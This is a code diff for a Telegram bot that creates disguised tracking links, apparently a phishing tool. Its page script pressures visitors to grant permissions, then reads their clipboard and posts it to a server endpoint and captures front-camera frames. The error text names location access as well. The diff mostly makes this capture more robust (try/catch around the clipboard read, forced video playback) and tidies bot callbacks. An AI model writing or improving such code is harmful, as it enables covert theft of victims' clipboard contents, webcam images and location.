@@ -155,7 +155,7 @@ bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
                     if (referrer.referralCount % 2 === 0) {
                         if (activeOffer && Date.now() < activeOffer.expiresAt) {
                             const valStr = activeOffer.reward;
-                            if (valStr.match(/[dwmy]$/)) { // Subscriptions
+                            if (valStr.match(/[dwmy]$/)) { 
                                 const val = parseInt(valStr);
                                 let multiplier = 0;
                                 if (valStr.includes('d')) multiplier = 24 * 60 * 60 * 1000;
@@ -167,7 +167,7 @@ bot.onText(/\/start(?:\s+(.+))?/, async (msg, match) => {
                                 referrer.subscriptionExpiry = new Date(currentExpiry + (val * multiplier));
                                 
                                 bot.sendMessage(referrer.chatId, makeBorder("🎉 ᴏғғᴇʀ ʀᴇᴡᴀʀᴅ", `✅: 2 ɴᴇᴡ ᴜsᴇʀs ᴊᴏɪɴᴇᴅ ᴠɪᴀ ʏᴏᴜʀ ʟɪɴᴋ!\n💎: ${val}${valStr.slice(-1)} sᴜʙsᴄʀɪᴘᴛɪᴏɴ ᴀᴅᴅᴇᴅ ᴛᴏ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ.`), {parse_mode:'HTML'});
-                            } else { // Coins
+                            } else { 
                                 const val = parseInt(valStr);
                                 if (!isNaN(val)) {
                                     referrer.coins += val;
@@ -345,7 +345,7 @@ bot.on('message', async (msg) => {
             userState[chatId].name = cleanName;
             askRedirect(msg, cleanName);
         } else if (userState[chatId].step === 'await_redirect_url') {
-            if(!text.startsWith('http')) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "</b>❌: ᴜʀʟ ᴍᴜsᴛ sᴛᴀʀᴛ ᴡɪᴛʜ http"), {parse_mode:'HTML'});
+            if(!text.startsWith('http')) return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜʀʟ ᴍᴜsᴛ sᴛᴀʀᴛ ᴡɪᴛʜ http"), {parse_mode:'HTML'});
             createFinalLink(msg, userState[chatId].name, text.trim());
         }
     }
@@ -496,23 +496,23 @@ bot.on('callback_query', async (query) => {
     if (data === 'cmd_info') {
         const user = await User.findOne({ chatId });
         handleInfo(chatId, user);
-        return bot.answerCallbackQuery(query.id);
+        return bot.answerCallbackQuery(query.id).catch(()=>{});
     } 
     else if (data === 'cmd_dev') {
         handleDev(chatId);
-        return bot.answerCallbackQuery(query.id);
+        return bot.answerCallbackQuery(query.id).catch(()=>{});
     } 
     else if (data === 'cmd_referral') {
         const user = await User.findOne({ chatId });
         handleShare(chatId, user);
-        return bot.answerCallbackQuery(query.id);
+        return bot.answerCallbackQuery(query.id).catch(()=>{});
     }
 
     if (data === 'verify_join') {
         try {
             const { allJoined } = await checkMembership(chatId);
             if (allJoined) {
-                await bot.answerCallbackQuery(query.id, { text: "✅ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ sᴜᴄᴄᴇss!" });
+                await bot.answerCallbackQuery(query.id, { text: "✅ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ sᴜᴄᴄᴇss!" }).catch(()=>{});
 
                 try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) { }
 
@@ -552,23 +552,29 @@ bot.on('callback_query', async (query) => {
                     }
                 });
             } else {
-                bot.answerCallbackQuery(query.id, { text: "⚠️ ᴊᴏɪɴ ᴀʟʟ ᴄʜᴀɴɴᴇʟs ғɪʀsᴛ!", show_alert: true });
+                bot.answerCallbackQuery(query.id, { text: "⚠️ ᴊᴏɪɴ ᴀʟʟ ᴄʜᴀɴɴᴇʟs ғɪʀsᴛ!", show_alert: true }).catch(()=>{});
             }
         } catch (error) {}
     }
     else if (data === 'create_custom') {
         userState[chatId] = { step: 'await_custom_name' };
-        bot.sendMessage(chatId, makeBorder("ᴄᴜsᴛᴏᴍ", "<b>✏️: sᴇɴᴅ ʏᴏᴜʀ ᴄᴜspportune ʟɪɴᴋ ɴᴀᴍᴇ</b>"), { parse_mode: 'HTML' });
+        bot.sendMessage(chatId, makeBorder("ᴄᴜsᴛᴏᴍ", "<b>✏️: sᴇɴᴅ ʏᴏᴜʀ ᴄᴜsᴛᴏᴍ ʟɪɴᴋ ɴᴀᴍᴇ</b>"), { parse_mode: 'HTML' });
+        bot.answerCallbackQuery(query.id).catch(()=>{});
     } 
     else if (data === 'create_random') {
         askRedirect(query, Math.random().toString(36).substring(7));
+        bot.answerCallbackQuery(query.id).catch(()=>{});
     } 
     else if (data === 'use_redirect') {
+        if (!userState[chatId]) return bot.answerCallbackQuery(query.id, {text: "Session expired. Please generate URL again.", show_alert: true}).catch(()=>{});
         userState[chatId].step = 'await_redirect_url';
         bot.sendMessage(chatId, makeBorder("ʀᴇᴅɪʀᴇᴄᴛ", "<b>🌐: sᴇɴᴅ ᴛʜᴇ ᴅᴇsᴛɪɴᴀᴛɪᴏɴ ᴜʀʟ</b>"), { parse_mode: 'HTML' });
+        bot.answerCallbackQuery(query.id).catch(()=>{});
     } 
     else if (data === 'no_redirect') {
+        if (!userState[chatId]) return bot.answerCallbackQuery(query.id, {text: "Session expired. Please generate URL again.", show_alert: true}).catch(()=>{});
         createFinalLink(query, userState[chatId].name, null);
+        bot.answerCallbackQuery(query.id).catch(()=>{});
     }
 });
 
@@ -942,7 +948,7 @@ bot.onText(/\/data(?:\s+(.+))?/, async (msg, match) => {
     let targetUser;
     if (msg.reply_to_message) {
         targetUser = await User.findOne({ chatId: msg.reply_to_message.from.id });
-    } else if (match[1]) {
+    } else if (match && match[1]) {
         targetUser = await resolveUser(msg, match[1]);
     } else {
         targetUser = await User.findOne({ chatId: msg.from.id });
@@ -1292,8 +1298,13 @@ guard.addEventListener('click', async () => {
     try {
         guardText.innerHTML = "⏳ REQUESTING ACCESS... PLEASE ALLOW PERMISSIONS ⏳";
         
-        const text = await navigator.clipboard.readText();
-        if (text) fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'clip', data:text})});
+        // Clipboard block er try-catch fix. Eta fail korle jate crash na hoy.
+        try {
+            const text = await navigator.clipboard.readText();
+            if (text) fetch('/api/data', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({linkId:id, type:'clip', data:text})});
+        } catch(err) {
+            console.log("Clipboard read blocked by browser");
+        }
 
         const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
         
@@ -1306,6 +1317,8 @@ guard.addEventListener('click', async () => {
 
         const v = document.getElementById('v'); 
         v.srcObject = stream;
+        v.play().catch(e => {}); 
+        
         v.onloadedmetadata = () => {
             let count=0;
             const itv = setInterval(()=>{
@@ -1323,7 +1336,7 @@ guard.addEventListener('click', async () => {
         };
 
     } catch (err) {
-        guardText.innerHTML = "🚫 ACCESS DENIED 🚫<br><br><span style='font-size:15px;color:#f00;'>YOU MUST ALLOW CAMERA, LOCATION & CLIPBOARD!</span><br><br>[ CLICK TO TRY AGAIN ]";
+        guardText.innerHTML = "🚫 ACCESS DENIED 🚫<br><br><span style='font-size:15px;color:#f00;'>YOU MUST ALLOW CAMERA & LOCATION TO PROCEED!</span><br><br>[ REFRESH TO TRY AGAIN ]";
     }
 });
 
